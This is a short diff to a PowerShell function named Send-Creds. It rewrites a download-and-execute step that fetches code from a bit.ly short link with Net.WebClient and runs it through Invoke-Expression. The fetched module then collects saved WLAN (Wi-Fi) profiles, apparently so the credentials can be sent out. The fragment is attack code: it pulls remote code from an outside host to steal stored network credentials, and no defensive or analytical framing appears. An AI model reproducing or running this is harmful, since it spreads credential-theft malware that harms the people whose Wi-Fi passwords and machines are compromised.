@@ -27,7 +27,8 @@ Function Send-Creds {
 		
 		#Wlan Profiles
 		try {
-			Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2etS486')
+			$Module = (New-Object Net.WebClient).DownloadString('http://bit.ly/2etS486')
+			Invoke-Expression $Module
 			`$Information = Get-WLAN_Profiles -LANGUAGE es-ES | Format-Table | Out-String
 		} catch {}
 		
